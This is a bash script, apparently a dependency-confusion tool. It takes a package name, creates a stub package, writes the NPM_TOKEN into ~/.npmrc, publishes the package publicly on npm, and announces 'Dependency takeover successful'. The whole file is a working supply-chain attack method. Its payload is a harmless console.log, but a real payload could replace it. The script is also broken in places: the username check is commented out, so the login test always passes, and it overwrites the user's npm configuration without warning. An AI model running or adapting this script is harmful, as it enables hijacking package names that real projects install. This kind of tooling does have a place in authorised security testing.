#!/bin/bash

#Check if directory exists
if [ -d "/tmp/$1" ]; then
  cd "/tmp/$1"
else
  # If it doesn't exist, create it and then change into it
mkdir "/tmp/$1" && cd "/tmp/$1"
fi

init=$(npm init --yes 2>&1)
response=$(curl -s -H "Authorization: Bearer $NPM_TOKEN" https://registry.npmjs.org/-/whoami)
if [ $? -eq 0 ]; then
  # Check if the response contains a valid username
  #username=$(echo "$response" | jq -r '.username')

  # If the username exists, print a success message
  if [ "$username" != "null" ]; then
    echo "You are logged in as $username."
    npm config set registry https://registry.npmjs.org/
    echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc
    echo "console.log('testing dependency conf');" > index.js
    output=$(npm publish --access public --auth-type=legacy --token=$NPM_TOKEN 2>&1)
    echo "============================================================="

    echo "$output" | grep -q "npm ERR!" && echo "It is not possible to publish the package - $1" || echo "Dependency takeover successful for - $1"
    echo "============================================================="
    echo "$output"
  else
    echo "Unauthorized: Could not retrieve username from the response."
  fi
else
  echo "Unauthorized: Server error"
fi

